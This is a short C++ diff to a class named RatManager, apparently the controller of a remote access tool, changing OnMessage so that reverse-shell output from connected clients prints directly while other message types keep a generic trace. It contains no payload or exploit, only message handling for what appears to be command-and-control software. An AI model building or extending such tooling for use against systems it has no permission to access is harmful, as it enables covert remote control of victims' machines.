@@ -76,10 +76,22 @@ void RatManager::OnDisconnection(const int client)
 
 void RatManager::OnMessage(const int client, const MessageType type, const std::span<char> content)
 {
-	Trace(
-		"\nClient %d sent: %d %s\n",
-		client,
-		type,
-		std::string(content.data(), content.size()).c_str()
-	);
+	const auto str = std::string(content.data(), content.size());
+
+	switch (type)
+	{
+		case MessageType::ReverseShellMessage:
+			Trace("%s", str.c_str());
+			break;
+
+		default:
+			Trace(
+				"\nClient %d sent: %d %s\n",
+				client,
+				type,
+				str.c_str()
+			);
+			break;
+	}
+	
 }
